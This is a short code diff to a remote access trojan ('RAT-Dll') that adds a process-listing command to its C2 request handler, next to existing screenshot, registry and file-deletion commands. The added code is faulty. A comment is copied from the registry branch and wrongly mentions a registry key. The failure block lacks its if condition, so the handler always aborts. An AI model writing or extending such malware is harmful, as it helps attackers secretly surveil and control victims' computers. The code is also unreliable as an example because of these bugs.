@@ -9,6 +9,7 @@
 #include "RAT-Dll-DeleteFile.h"
 #include "RAT-Dll-Screenshot.h"
 #include "RAT-Dll-Registry.h"
+#include "RAT-Dll-Process.h"
 
 
 /** This function will serve as our main 'handler' for C2 requests
@@ -185,6 +186,18 @@ INT startListen()
                     goto cleanup;
                 }
                 OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed registry read!\n");
+            }
+
+            // C2 says to read a registry key 
+            else if (strcmp((const char*)&recvBuf, PROCESSLIST) == 0)
+            {
+                status = handleProcessList(clientSock);
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleProcessList %d\n", status);
+                    OutputDebugStringA(msgBuf);
+                    goto cleanup;
+                }
+                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed process list!\n");
             }
         }
 
